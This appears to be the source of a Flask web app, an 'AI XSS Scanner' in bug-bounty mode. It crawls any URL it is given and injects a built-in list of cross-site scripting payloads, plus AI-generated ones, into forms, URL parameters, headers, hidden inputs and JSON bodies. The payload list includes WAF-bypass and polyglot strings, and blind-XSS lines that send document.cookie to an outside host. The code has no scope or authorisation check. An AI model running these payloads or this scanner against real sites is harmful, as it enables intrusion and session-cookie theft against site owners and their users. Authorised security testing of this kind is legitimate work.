import sys, os, threading, warnings, re, requests, time
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
warnings.filterwarnings("ignore")

from flask import Flask, render_template, request, jsonify
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from core.ai_agent import analyze_with_ai, generate_smart_payloads
from core.browser import verify_xss_with_browser

app = Flask(__name__, template_folder="templates", static_folder="static")

# ── 100+ Real Bug Bounty Payloads ─────────────────────────────────────────────
PAYLOADS = {
    "basic": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
    ],
    "attribute_break": [
        "'><script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
        "'><img src=x onerror=alert('XSS')>",
        "\"><img src=x onerror=alert('XSS')>",
        "' onmouseover=alert('XSS') '",
        "\" onmouseover=alert('XSS') \"",
        "' onfocus=alert('XSS') autofocus '",
        "\"><svg onload=alert('XSS')>",
    ],
    "waf_bypass": [
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<SCRIPT>alert('XSS')</SCRIPT>",
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        "<<script>alert('XSS');//<</script>",
        "<script>alert`XSS`</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert('XSS')>",
        "<svg onload=\"alert('XSS')\">",
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",
        "<img src=\"x\" onerror=\"alert('XSS')\">",
        "</script><script>alert('XSS')</script>",
        "<input type=text value='' onfocus=alert('XSS') autofocus>",
    ],
    "event_handlers": [
        "<input autofocus onfocus=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
        "<video><source onerror=alert('XSS')>",
        "<body onpageshow=alert('XSS')>",
        "<div onmouseover=alert('XSS')>hover</div>",
        "<a href=# onclick=alert('XSS')>click</a>",
    ],
    "js_injection": [
        "';alert('XSS');//",
        "\";alert('XSS');//",
        "';alert(String.fromCharCode(88,83,83))//",
        "\"-alert('XSS')-\"",
        "'-alert('XSS')-'",
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
    ],
    "dom_based": [
        "#<script>alert('XSS')</script>",
        "#<img src=x onerror=alert('XSS')>",
        "#<svg onload=alert('XSS')>",
        "?callback=alert('XSS')",
        "?next=javascript:alert('XSS')",
        "?redirect=javascript:alert('XSS')",
        "?url=javascript:alert('XSS')",
        "?returnUrl=javascript:alert('XSS')",
    ],
    "polyglot": [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        "\"><img src=1 onerror=alert(1)>",
        "';alert(0)//\\';alert(0)//\";alert(0)//\";alert(0)//--></SCRIPT>\">'><SCRIPT>alert(0)</SCRIPT>=&{}",
    ],
    "blind_xss": [
        "<script src=https://xsshunter.com/burpcollab></script>",
        "'><script src=https://xsshunter.com/burpcollab></script>",
        "<img src=x onerror=this.src='https://xsshunter.com/?c='+document.cookie>",
    ]
}

ALL_PAYLOADS = [p for cat in PAYLOADS.values() for p in cat]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "keep-alive"
}

# ── global state ──────────────────────────────────────────────────────────────
state = {
    "status":   "idle",
    "logs":     [],
    "findings": [],
    "params":   {},
    "target":   "",
    "stats": {
        "pages": 0, "forms": 0, "params": 0,
        "payloads_tested": 0, "verified": 0, "screenshots": 0
    }
}

def log(msg):
    print(msg)
    state["logs"].append(msg)

# ── HTTP helpers ──────────────────────────────────────────────────────────────
def fetch(url, cookies=None, extra_headers=None):
    try:
        h = dict(HEADERS)
        if extra_headers:
            h.update(extra_headers)
        r = requests.get(url, headers=h, timeout=15,
                         verify=False, allow_redirects=True,
                         cookies=cookies or {})
        return r.text, r.status_code, dict(r.cookies)
    except Exception:
        return "", 0, {}

def post(url, data, cookies=None):
    try:
        r = requests.post(url, data=data, headers=HEADERS,
                          timeout=15, verify=False,
                          cookies=cookies or {})
        return r.text
    except Exception:
        return ""

# ── parameter extraction ──────────────────────────────────────────────────────
def extract_all_params(url, html):
    params = {
        "url_params":    {},
        "form_params":   [],
        "hidden_inputs": [],
        "cookie_params": [],
        "js_params":     [],
        "api_endpoints": [],
        "header_params": ["Referer", "User-Agent", "X-Forwarded-For",
                          "X-Original-URL", "X-Rewrite-URL"]
    }
    parsed = urlparse(url)
    params["url_params"] = {k: v[0] for k, v in parse_qs(parsed.query).items()}

    soup = BeautifulSoup(html, "html.parser")

    for form in soup.find_all("form"):
        action = urljoin(url, form.attrs.get("action", url))
        method = form.attrs.get("method", "get").upper()
        inputs = []
        for tag in form.find_all(["input", "textarea", "select"]):
            n = tag.attrs.get("name", "")
            t = tag.attrs.get("type", "text").lower()
            if n:
                inputs.append({"name": n, "type": t,
                                "value": tag.attrs.get("value", "")})
                if t == "hidden":
                    params["hidden_inputs"].append(n)
        if inputs:
            params["form_params"].append({
                "action": action, "method": method, "inputs": inputs
            })

    try:
        r = requests.get(url, headers=HEADERS, timeout=10, verify=False)
        for c in r.cookies:
            params["cookie_params"].append(c.name)
    except Exception:
        pass

    js_pat  = re.compile(r'(?:var|let|const)\s+(\w+)\s*=', re.I)
    api_pat = re.compile(r'(?:fetch|axios|\.get|\.post)\s*\(\s*["\']([^"\']+)["\']', re.I)
    for script in soup.find_all("script"):
        text = script.string or ""
        for m in js_pat.finditer(text):
            v = m.group(1)
            if v not in params["js_params"]:
                params["js_params"].append(v)
        for m in api_pat.finditer(text):
            ep = m.group(1)
            if ep.startswith(("/", "http")):
                full = urljoin(url, ep)
                if full not in params["api_endpoints"]:
                    params["api_endpoints"].append(full)

    return params

# ── crawl ─────────────────────────────────────────────────────────────────────
def crawl(base_url, max_pages=50):
    visited  = set()
    to_visit = {base_url}
    pages    = []
    host     = urlparse(base_url).netloc

    while to_visit and len(visited) < max_pages:
        url = to_visit.pop()
        if url in visited:
            continue
        visited.add(url)
        html, code, cookies = fetch(url)
        if not html:
            continue
        soup   = BeautifulSoup(html, "html.parser")
        forms  = []
        for form in soup.find_all("form"):
            action = urljoin(url, form.attrs.get("action", url))
            method = form.attrs.get("method", "get").lower()
            inputs = []
            for tag in form.find_all(["input", "textarea", "select"]):
                t = tag.attrs.get("type", "text").lower()
                n = tag.attrs.get("name", "")
                if n and t not in ["submit", "button", "reset", "image", "file"]:
                    inputs.append(n)
            if inputs:
                forms.append({"action": action, "method": method, "inputs": inputs})

        params = {k: v[0] for k, v in parse_qs(urlparse(url).query).items()}

        for a in soup.find_all("a", href=True):
            href = a["href"].strip()
            if not href or href.startswith(("mailto:", "tel:", "javascript:", "#")):
                continue
            full = urljoin(base_url, href)
            if urlparse(full).netloc == host:
                to_visit.add(full.split("#")[0])

        pages.append({
            "url": url, "forms": forms,
            "params": params, "html": html, "cookies": cookies
        })
        log(f"[+] {url} | Forms:{len(forms)} Params:{len(params)}")

    return pages

# ── injection ─────────────────────────────────────────────────────────────────
def test_form(url, form, payload):
    data = {n: payload for n in form["inputs"]}
    try:
        if form["method"] == "post":
            r = requests.post(form["action"], data=data,
                              headers=HEADERS, timeout=15, verify=False)
        else:
            r = requests.get(form["action"], params=data,
                             headers=HEADERS, timeout=15, verify=False)
        return r.text
    except Exception:
        return ""

def test_url_param(url, payload):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        return []
    results = []
    for param in params:
        new_p = {k: v[0] for k, v in params.items()}
        new_p[param] = payload
        new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_p)}"
        try:
            r = requests.get(new_url, headers=HEADERS, timeout=15, verify=False)
            results.append({"url": new_url, "param": param, "response": r.text})
        except Exception:
            continue
    return results

def test_header(url, payload):
    """Test XSS via HTTP headers reflected in response"""
    findings = []
    test_headers = {
        "Referer":         payload,
        "User-Agent":      payload,
        "X-Forwarded-For": payload,
        "X-Original-URL":  payload,
    }
    for header, val in test_headers.items():
        try:
            h = dict(HEADERS)
            h[header] = val
            r = requests.get(url, headers=h, timeout=10, verify=False)
            if payload in r.text:
                findings.append({"header": header, "url": url})
        except Exception:
            continue
    return findings

def test_json_param(url, payload):
    """Test XSS in JSON POST body"""
    findings = []
    try:
        r = requests.get(url, headers=HEADERS, timeout=10, verify=False)
        soup = BeautifulSoup(r.text, "html.parser")
        for script in soup.find_all("script"):
            text = script.string or ""
            keys = re.findall(r'"(\w+)"\s*:', text)
            if keys:
                for key in keys[:5]:
                    data = {key: payload}
                    try:
                        resp = requests.post(
                            url,
                            json=data,
                            headers={**HEADERS, "Content-Type": "application/json"},
                            timeout=10, verify=False
                        )
                        if payload in resp.text:
                            findings.append({"param": key, "url": url})
                    except Exception:
                        continue
    except Exception:
        pass
    return findings

def test_open_redirect(url):
    """Test for open redirect which can lead to XSS"""
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    redirect_params = ["next", "url", "redirect", "return",
                       "returnUrl", "goto", "dest", "destination",
                       "redir", "redirect_uri", "callback"]
    for param in redirect_params:
        if param in params:
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode({param: 'javascript:alert(1)'})}"
            try:
                r = requests.get(test_url, headers=HEADERS,
                                 timeout=10, verify=False,
                                 allow_redirects=False)
                loc = r.headers.get("Location", "")
                if "javascript:" in loc:
                    findings.append({"param": param, "url": test_url})
            except Exception:
                continue
    return findings

# ── add finding ───────────────────────────────────────────────────────────────
def add_finding(finding):
    for f in state["findings"]:
        if (f["url"] == finding["url"] and
                f["payload"] == finding["payload"] and
                f["param"] == finding["param"]):
            return

    finding["analysis"]   = analyze_with_ai(finding)
    finding["screenshot"] = None
    finding["alert_text"] = None
    finding["verified"]   = False
    state["findings"].append(finding)
    log(f"[!!!] {finding['type']} | Param:{finding['param']} | {finding['url'][:60]}")

    def verify():
        try:
            log(f"[Browser] Verifying: {finding['url'][:50]}")
            result = verify_xss_with_browser(
                finding["url"],
                finding["payload"],
                finding["param"],
                finding.get("method", "get")
            )
            finding["verified"]   = result["verified"]
            finding["alert_text"] = result["alert_text"]
            finding["screenshot"] = result["screenshot"]
            if result["verified"]:
                state["stats"]["verified"] += 1
                if result["screenshot"]:
                    state["stats"]["screenshots"] += 1
                log(f"[Browser] VERIFIED! Alert='{result['alert_text']}'")
            else:
                log(f"[Browser] Not verified (may still be vulnerable)")
        except Exception as e:
            log(f"[Browser] Error: {e}")

    threading.Thread(target=verify, daemon=True).start()

# ── main scan ─────────────────────────────────────────────────────────────────
def run_scan(target, scan_mode="full"):
    try:
        state["status"]   = "running"
        state["logs"]     = []
        state["findings"] = []
        state["params"]   = {}
        state["target"]   = target
        state["stats"]    = {
            "pages": 0, "forms": 0, "params": 0,
            "payloads_tested": 0, "verified": 0, "screenshots": 0
        }

        log(f"[*] ===== AI XSS SCANNER v2.0 (Bug Bounty Mode) =====")
        log(f"[*] Target : {target}")
        log(f"[*] Mode   : {scan_mode.upper()}")
        log(f"[*] Payloads: {len(ALL_PAYLOADS)}")

        # Phase 1: Extract all parameters
        log(f"[*] Phase 1: Extracting ALL parameters...")
        html, status, cookies = fetch(target)
        if not html:
            log(f"[-] Cannot reach {target}")
            state["status"] = "complete"
            return

        all_params = extract_all_params(target, html)
        state["params"] = all_params
        log(f"[PARAM] URL params   : {list(all_params['url_params'].keys())}")
        log(f"[PARAM] Form inputs  : {sum(len(f['inputs']) for f in all_params['form_params'])}")
        log(f"[PARAM] Hidden inputs: {all_params['hidden_inputs']}")
        log(f"[PARAM] Cookies      : {all_params['cookie_params']}")
        log(f"[PARAM] JS variables : {len(all_params['js_params'])}")
        log(f"[PARAM] API endpoints: {len(all_params['api_endpoints'])}")

        # Phase 2: Crawl
        log(f"[*] Phase 2: Crawling all pages...")
        max_pages = 100 if scan_mode == "deep" else 50
        pages = crawl(target, max_pages=max_pages)
        state["stats"]["pages"] = len(pages)
        state["stats"]["forms"] = sum(len(p["forms"]) for p in pages)
        log(f"[*] Crawled {len(pages)} pages | {state['stats']['forms']} forms found")

        # Phase 3: AI smart payloads
        log(f"[*] Phase 3: AI generating smart payloads...")
        ai_payloads = []
        try:
            first_inputs = []
            if pages and pages[0]["forms"]:
                for form in pages[0]["forms"]:
                    first_inputs.extend(form["inputs"])
            context = {"url": target, "inputs": first_inputs, "hint": html[:300]}
            ai_payloads = generate_smart_payloads(context)
            if ai_payloads:
                log(f"[AI] Generated {len(ai_payloads)} smart payloads")
            else:
                log(f"[AI] Using built-in payloads (add GEMINI_API_KEY for AI)")
        except Exception as e:
            log(f"[AI] {e}")

        all_payloads = ALL_PAYLOADS + ai_payloads
        log(f"[*] Total payloads: {len(all_payloads)}")

        # Phase 4: XSS injection
        log(f"[*] Phase 4: XSS injection testing...")
        for i, page in enumerate(pages):
            url = page["url"]
            log(f"[*] [{i+1}/{len(pages)}] {url}")

            # 4a. Form testing
            for form in page["forms"]:
                log(f"    [FORM] {form['method'].upper()} {form['action']} -> {form['inputs']}")
                for payload in all_payloads:
                    state["stats"]["payloads_tested"] += 1
                    try:
                        response = test_form(url, form, payload)
                        if response and payload in response:
                            add_finding({
                                "url":      form["action"],
                                "type":     "Reflected XSS (Form)",
                                "payload":  payload,
                                "param":    str(form["inputs"]),
                                "severity": "HIGH",
                                "method":   form["method"].upper()
                            })
                            break
                    except Exception:
                        continue

            # 4b. URL param testing
            if page["params"]:
                log(f"    [PARAM] {list(page['params'].keys())}")
                for payload in all_payloads:
                    state["stats"]["payloads_tested"] += 1
                    try:
                        results = test_url_param(url, payload)
                        for r in results:
                            if payload in r["response"]:
                                add_finding({
                                    "url":      r["url"],
                                    "type":     "Reflected XSS (URL Param)",
                                    "payload":  payload,
                                    "param":    r["param"],
                                    "severity": "HIGH",
                                    "method":   "GET"
                                })
                    except Exception:
                        continue

            # 4c. Header injection
            log(f"    [HEADER] Testing header injection...")
            for payload in PAYLOADS["basic"][:3]:
                state["stats"]["payloads_tested"] += 1
                results = test_header(url, payload)
                for r in results:
                    add_finding({
                        "url":      r["url"],
                        "type":     "Header XSS",
                        "payload":  payload,
                        "param":    r["header"],
                        "severity": "MEDIUM",
                        "method":   "HEADER"
                    })

            # 4d. Open redirect
            redirect_results = test_open_redirect(url)
            for r in redirect_results:
                add_finding({
                    "url":      r["url"],
                    "type":     "Open Redirect (XSS Vector)",
                    "payload":  "javascript:alert(1)",
                    "param":    r["param"],
                    "severity": "MEDIUM",
                    "method":   "GET"
                })

            # 4e. DOM-based XSS (URL fragment)
            for payload in PAYLOADS["dom_based"]:
                state["stats"]["payloads_tested"] += 1
                dom_url = url + payload if "?" not in payload else url + "&" + payload.lstrip("?")
                try:
                    r = requests.get(dom_url, headers=HEADERS, timeout=10, verify=False)
                    if payload.split("=")[-1] in r.text:
                        add_finding({
                            "url":      dom_url,
                            "type":     "DOM-Based XSS",
                            "payload":  payload,
                            "param":    "URL Fragment",
                            "severity": "HIGH",
                            "method":   "GET"
                        })
                except Exception:
                    continue

            # 4f. JSON param testing (deep mode)
            if scan_mode == "deep":
                log(f"    [JSON] Testing JSON params...")
                json_results = test_json_param(url, "<script>alert('XSS')</script>")
                for r in json_results:
                    add_finding({
                        "url":      r["url"],
                        "type":     "JSON Body XSS",
                        "payload":  "<script>alert('XSS')</script>",
                        "param":    r["param"],
                        "severity": "HIGH",
                        "method":   "POST"
                    })

            # 4g. Hidden input testing
            page_params = extract_all_params(url, page["html"])
            for hidden in page_params["hidden_inputs"]:
                for payload in PAYLOADS["basic"][:5]:
                    state["stats"]["payloads_tested"] += 1
                    try:
                        test_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}{urlparse(url).path}?{urlencode({hidden: payload})}"
                        r = requests.get(test_url, headers=HEADERS, timeout=10, verify=False)
                        if payload in r.text:
                            add_finding({
                                "url":      test_url,
                                "type":     "Reflected XSS (Hidden Input)",
                                "payload":  payload,
                                "param":    hidden,
                                "severity": "HIGH",
                                "method":   "GET"
                            })
                            break
                    except Exception:
                        continue

        total = len(state["findings"])
        log(f"[*] =========================================")
        log(f"[*] SCAN COMPLETE!")
        log(f"[*] Pages Scanned   : {state['stats']['pages']}")
        log(f"[*] Forms Tested    : {state['stats']['forms']}")
        log(f"[*] Payloads Tested : {state['stats']['payloads_tested']}")
        log(f"[*] Vulnerabilities : {total}")
        log(f"[*] Browser Verified: {state['stats']['verified']}")
        log(f"[*] Screenshots     : {state['stats']['screenshots']}")
        log(f"[*] =========================================")
        state["status"] = "complete"

    except Exception as e:
        import traceback
        log(f"[ERROR] {e}")
        log(traceback.format_exc())
        state["status"] = "complete"

# ── routes ────────────────────────────────────────────────────────────────────
@app.route("/")
def index():
    return render_template("index.html")

@app.route("/scan", methods=["POST"])
def start_scan():
    data      = request.json
    target    = data.get("url", "").strip()
    scan_mode = data.get("mode", "full")
    if not target:
        return jsonify({"error": "No URL provided"}), 400
    if not target.startswith("http"):
        target = "http://" + target
    if state["status"] == "running":
        return jsonify({"error": "Scan already running"}), 400
    threading.Thread(target=run_scan, args=(target, scan_mode), daemon=True).start()
    return jsonify({"status": "started", "target": target})

@app.route("/poll")
def poll():
    return jsonify({
        "status":   state["status"],
        "logs":     state["logs"],
        "findings": state["findings"],
        "params":   state["params"],
        "stats":    state["stats"]
    })

@app.route("/stop", methods=["POST"])
def stop():
    state["status"] = "complete"
    log("[*] Scan stopped by user")
    return jsonify({"status": "stopped"})

@app.route("/report/pdf")
def pdf_report():
    if not state["findings"]:
        return jsonify({"error": "No findings"}), 400
    try:
        from report.generator import generate_pdf
        f = generate_pdf(state["findings"], state["target"])
        return jsonify({"file": f})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/report/json")
def json_report():
    if not state["findings"]:
        return jsonify({"error": "No findings"}), 400
    try:
        from report.generator import generate_json
        f = generate_json(state["findings"], state["target"])
        return jsonify({"file": f})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    os.makedirs("reports", exist_ok=True)
    os.makedirs("static/screenshots", exist_ok=True)
    print("[*] AI XSS Scanner v2.0 - Bug Bounty Mode")
    print("[*] Running at http://localhost:5001")
    app.run(host="0.0.0.0", port=5001, debug=False, threaded=True)
